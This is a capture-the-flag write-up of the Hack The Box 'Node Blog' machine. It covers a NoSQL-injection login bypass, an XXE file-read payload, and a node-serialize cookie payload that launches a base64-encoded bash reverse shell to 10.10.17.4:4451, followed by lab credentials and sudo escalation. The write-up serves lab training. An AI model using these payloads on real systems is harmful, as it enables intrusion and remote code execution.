---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/node-blog/","tags":["#linux","express","nosqli","loginBypass","deserialization","node","XXE","lfi","FileUpload"],"dg-note-properties":{"Difficulty":"easy","tags":["#linux","express","nosqli","loginBypass","deserialization","node","XXE","lfi","FileUpload"]}}
---

# 10.129.96.160
---
# Initial Enumeration & Recon bits
I like to leave my Discovery/Enumeration & Recon relatively unstructured, just to build up application context so I can think about how to crack it
## Ports

```sh hl:15,16
rustscan -b 500 --ulimit 5000 -a 10.129.96.160 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/brumbo/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.96.160:22
Open 10.129.96.160:5000
[~] Starting Script(s)
---------------------------------------------------------------
```

```bash hl:2,10
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZBURYGCLr4lZI1F55bUh/6vKCfmeGumtAhhNrg9lH4UNDB/wCjPbD+xovPp3UdbrOgNdqTCdZcOk5rQDyRK2YH6tq8NlP59myIQV/zXC9WQnhxn131jf/KlW78vzWaLfMU+m52e1k+YpomT5PuSMG8EhGwE5bL4o0Jb8Unafn13CJKZ1oj3awp31fRJDzYGhTjl910PROJAzlOQinxRYdUkc4ZT0qZRohNlecGVsKPpP+2Ql+gVuusUEQt7gPFPBNKw3aLtbLVTlgEW09RB9KZe6Fuh8JszZhlRpIXDf9b2O0rINAyek8etQyFFfxkDBVueZA50wjBjtgOtxLRkvfqlxWS8R75Urz8AR2Nr23AcAGheIfYPgG8HzBsUuSN5fI8jsBCekYf/ZjPA/YDM4aiyHbUWfCyjTqtAVTf3P4iqbEkw9DONGeohBlyTtEIN7pY3YM5X3UuEFIgCjlqyjLw6QTL4cGC5zBbrZml7eZQTcmgzfU6pu220wRo5GtQ3U=
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0=
|   256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY
5000/tcp open  http    syn-ack Node.js (Express middleware)
|_http-title: Blog
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Other Recon Bits

![Pasted image 20260502001929.png](/img/user/img/Pasted%20image%2020260502001929.png)
- basic blog site
### Login form
![Pasted image 20260502002125.png](/img/user/img/Pasted%20image%2020260502002125.png)
- simple urlencoded login form
  ![Pasted image 20260502002225.png](/img/user/img/Pasted%20image%2020260502002225.png)
- also accepts json
  ![Pasted image 20260502002303.png](/img/user/img/Pasted%20image%2020260502002303.png)
- regular sqli bypass didn't work, and bruteforcing is usually not a thing for logins on htb, so maybe nosqli?
- nosqli works for login bypass
  ![Pasted image 20260502003005.png](/img/user/img/Pasted%20image%2020260502003005.png)

### New article
- no html tags allowed
  
### File upload
- =>`POST /articles/xml`
- seems to take an xml file for a blog post
- xxe file include the `server.js`?
- `/opt/blog/server.js`

> [!bug]+ payload/poc
> ```xml
><?xml version="1.0" encoding="UTF-8"?>
>
><!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file://opt/blog/server.js"> ]>
>
><post>
> <title>incl</title>
><description>include</description>
><markdown>
>   <svg>&xxe;</svg>
> </markdown>
></post>
> ```
>
> > [!example]+ details
> > ```sh
> > failed upload shows expected xml structure of post -> title, description, markdown
> > ```

![Pasted image 20260502234325.png](/img/user/img/Pasted%20image%2020260502234325.png)

![Pasted image 20260503001523.png](/img/user/img/Pasted%20image%2020260503001523.png)
- admin creds
### Insecure Deserialization
![Pasted image 20260502234752.png](/img/user/img/Pasted%20image%2020260502234752.png)

![Pasted image 20260502234414.png](/img/user/img/Pasted%20image%2020260502234414.png)
- straight deserialization with no checks or validation, likely vulnerable to RCE, see exploitation to foothold payload
  
## Recon Findings Summary:
1. find login page => nosql login bypass
2. find xml upload => XXE file inclusion
3. read server.js at `/opt/blog/server.js`
4. insecure deserialization in auth cookie

## Creds
`admin:IppsecSaysPleaseSubscribe`
# Exploitation -> foothold

## Tried and didn't work
- ~~login bruteforce~~
- ~~sql injection login bypass~~

## What Worked
1. create RCE serialized js object
2. use command of choice, ping, revshell etc
	1. for revshells I find `echo $base64revshellpayload | base64 -d | bash` to work pretty well
3. url encode it, make sure special characters are encoded too
4. set your auth cookie to payload and have a listener ready to catch the revshell/command response (ping, etc)
   
> [!bug]+ payload/poc
> ```http
> auth=%7B%22rce%22%3A%22%5F%24%24ND%5FFUNC%24%24%5Ffunction%28%29%7Brequire%28%27child%5Fprocess%27%29%2Eexec%28%27echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNy40LzQ0NTEgMD4mMQ%3D%3D%7Cbase64%20%2Dd%7Cbash%27%2C%20function%28error%2C%20stdout%2C%20stderr%29%7Bconsole%2Elog%28stdout%29%7D%29%3B%7D%28%29%22%7D
> ```
>
> > [!example]+ details
> > ```sh
> > {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy40LzQ0NTEgMD4mMQ==|base64 -d|bash', function(error, stdout, stderr){console.log(stdout)});}()"}
> > ```
> > - serialized rce payload from hacktricks + added base64 decode revshell
> > ```url
> >%7B%22rce%22%3A%22%5F%24%24ND%5FFUNC%24%24%5Ffunction%28%29%7Brequire%28%27child%5Fprocess%27%29%2Eexec%28%27echo%20YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNy40LzQ0NTEgMD4mMQ%3D%3D%7Cbase64%20%2Dd%7Cbash%27%2C%20function%28error%2C%20stdout%2C%20stderr%29%7Bconsole%2Elog%28stdout%29%7D%29%3B%7D%28%29%22%7D
> > ```
> > - make sure special chars are encoded too (cyberchef)
>
>  
> 
> set url encoded final payload to `auth` cookie and have listener of choice ready

![Pasted image 20260502235730.png](/img/user/img/Pasted%20image%2020260502235730.png)


> [!tip] Tip
> - flag is in admin home dir, but we can't access it, despite being owner? no problem, can just add perms

![Pasted image 20260503000129.png](/img/user/img/Pasted%20image%2020260503000129.png)



# Post Exploitation, Pivoting, & Privesc
## System Enumeration
### Users
- only admin user, only part of group 'admin'

![Pasted image 20260503000416.png](/img/user/img/Pasted%20image%2020260503000416.png)
- potentially passwd reuse from webapp gathered from `/routes/login`?
![Pasted image 20260503001636.png](/img/user/img/Pasted%20image%2020260503001636.png)
- indeed, so a simple `sudo su` to get root access, since admin can run all commands
## What Worked
- `sudo -l` to see what/if admin user can run sudo
- `sudo su` to get root shell

---
### rumination/rubber duck/misc
- guided mode suggests getting into the mongodb instance, so finding hardcoded creds on /routes/login saved me some time
  ![Pasted image 20260503003327.png](/img/user/img/Pasted%20image%2020260503003327.png)
- this is how you can dump mongodb, assuming `current_user` can read it. forgot you need to use `bsondump` though
  
  
- I don't really like insecure deserialization payload tweaking, took me forever to get the payload correct to catch the revshell. ping tested worked easily enough but revshells can be tricky.